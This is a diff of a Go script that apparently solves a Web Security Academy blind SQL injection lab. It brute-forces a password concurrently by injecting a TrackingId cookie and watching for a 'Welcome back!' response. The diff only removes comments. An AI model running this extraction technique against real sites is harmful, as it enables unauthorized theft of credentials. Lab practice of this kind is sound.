@@ -18,7 +18,6 @@ import (
 	"sync"
 )
 
-// Configuration
 const (
 	TargetURL   = "https://0a1600b304ad9842847b270800370027.web-security-academy.net/"
 	ConditionalResponse = "Welcome back!"
@@ -32,9 +31,8 @@ const (
 )
 var Password []rune
 
-// Global client to reuse TCP connections (Keep-Alive)
 var client = &http.Client{
-	Timeout: 0, // No timeout for CTF, but in prod set this to 10s
+	Timeout: 0, 
 }
 
 
@@ -56,25 +54,21 @@ func main() {
 	fmt.Printf("[*] Final Password: %s\n", string(Password))
 
 }
-// bruteForcePosition handles the logic for a SINGLE character position
+
 func bruteForcePosition(pos int) bool {
 	// Create a buffered channel big enough for all chars so we don't block
 	jobs := make(chan rune, len(chars))
 	
-	// Create a context that we can cancel once we find the char
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
 	var wg sync.WaitGroup
 
-	// 1. Fill the jobs channel with all characters
 	for _, ch := range chars {
 		jobs <- ch
 	}
-	close(jobs) // Safe to close here because we are done sending
+	close(jobs) 
 
-	// 2. Start Workers
-	// We use a safe boolean to track if we found it to update UI cleanly
 	foundCh := make(chan rune, 1)
 
 	fmt.Printf("\r[*] Brute forcing position %d...", pos)
@@ -87,11 +81,10 @@ func bruteForcePosition(pos int) bool {
 		}()
 	}
 
-	// 3. Wait for workers to finish (either all done or context cancelled)
+
 	wg.Wait()
 	close(foundCh)
 
-	// Check if we found something
 	if foundChar, ok := <-foundCh; ok {
 		Password[pos-1] = foundChar
 		fmt.Printf("[+] Position %d found: %c\n", pos, foundChar)
@@ -123,7 +116,7 @@ func worker(ctx context.Context, jobs <-chan rune, pos int, foundCh chan<- rune,
 }
 
 func attack(ctx context.Context, pos int, ch rune) bool {
-	// Create Request
+	
 	req, err := http.NewRequestWithContext(ctx, "GET", TargetURL, nil)
 	if err != nil {
 		return false
@@ -133,10 +126,10 @@ func attack(ctx context.Context, pos int, ch rune) bool {
 
 	cookie := fmt.Sprintf("TrackingId=0xPelamar%s", exploitedCookie)
 	req.Header.Add("Cookie", cookie)
-	// Execute
+	
 	resp, err := client.Do(req)
 	if err != nil {
-		return false // Ignore network errors in brute force
+		return false 
 	}
 	defer resp.Body.Close()
 
